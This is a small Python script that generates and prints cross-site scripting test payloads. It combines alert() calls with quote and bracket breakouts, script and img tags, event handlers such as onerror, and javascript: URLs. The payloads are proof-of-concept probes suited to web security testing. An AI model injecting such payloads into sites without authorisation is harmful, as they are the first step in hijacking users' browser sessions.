base_payload_list = ["alert()","alert;throw 1"]
quotation_list = ["","\"","'","`"]
bracket_c_list = ["",">"]
bracket_o_list = ["<a href="]

script_runner_list = [
  "{base_payload}",
  "javascript:{base_payload}",
  "{quote} {event_tag}={quote}{base_payload}",
  "{quote}{bracket_c}<script>{base_payload}</script>{bracket_o}{quote}",
  "{quote}{bracket_c}<img src=1 {event_tag}={base_payload}>{bracket_o}{quote}",
  "{quote}{bracket_c}<img src=\"javascript:{base_payload}\">{bracket_o}{quote}",
  "{quote}{bracket_c}<a href=\"javascript:{base_payload}\">{bracket_o}{quote}"
]

event_tag_list = [
  "onload",
  "onerror",
  "autofocus onfocus"
]

plain_payload_list = []

class payload_parameters:
  base_payload=""
  quate=""
  event_tag=""
  script_runner=""
  bracket_o=""
  bracket_c=""
  
def build_plain_payloads():
  pay_par = payload_parameters()
  for script_runner in script_runner_list:
    pay_par.script_runner = script_runner
    for base_payload in base_payload_list:
      pay_par.base_payload = base_payload
      for event_tag in event_tag_list:
        pay_par.event_tag = event_tag
        for quote in quotation_list:
          pay_par.quote = quote
          for bracket_c in bracket_c_list:
            pay_par.bracket_c = bracket_c
            if bracket_c=="":
              pay_par.bracket_o = ""
              build_plain_payload_for_param(pay_par)
            else:
              for bracket_o in bracket_o_list:
                pay_par.bracket_o = bracket_o
                build_plain_payload_for_param(pay_par)
              
def build_plain_payload_for_param(pay_par):
  global plain_payload_list
  plain_payload_list.append(
    pay_par.script_runner.format(
      base_payload=pay_par.base_payload,
      event_tag=pay_par.event_tag,
      quote=pay_par.quote,
      bracket_c=pay_par.bracket_c,
      bracket_o=pay_par.bracket_o
    )
  )
  plain_payload_list = sorted(set(plain_payload_list),key=plain_payload_list.index)

obfuscated_payload_list = []
def obfuscate_payloads():
  global obfuscated_payload_list
  for plain_payload in plain_payload_list:
    obfuscated_payload_list.append(plain_payload)

build_plain_payloads()
obfuscate_payloads()
for payload in obfuscated_payload_list:
  print(payload)
